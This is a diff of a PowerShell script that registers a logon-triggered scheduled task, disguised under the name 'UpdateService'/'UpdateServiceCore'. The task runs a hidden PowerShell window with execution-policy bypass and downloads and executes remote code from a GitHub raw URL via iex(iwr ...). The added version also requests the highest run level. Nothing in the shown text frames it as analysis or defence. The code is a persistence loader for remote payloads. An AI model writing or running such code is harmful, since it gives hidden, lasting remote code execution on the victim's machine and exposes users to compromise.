@@ -1,5 +1,10 @@
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-schtasks /create /tn "UpdateService" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru $currentUser /f
-schtasks /run /tn "UpdateService"
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code' -UseBasicP)"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -StartWhenAvailable -AllowStartIfOnBatteries
+
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "UpdateServiceCore" -Description "Runs script on logon" -Force -Settings $settings
+Start-ScheduledTask -TaskName "UpdateServiceCore"
 exit
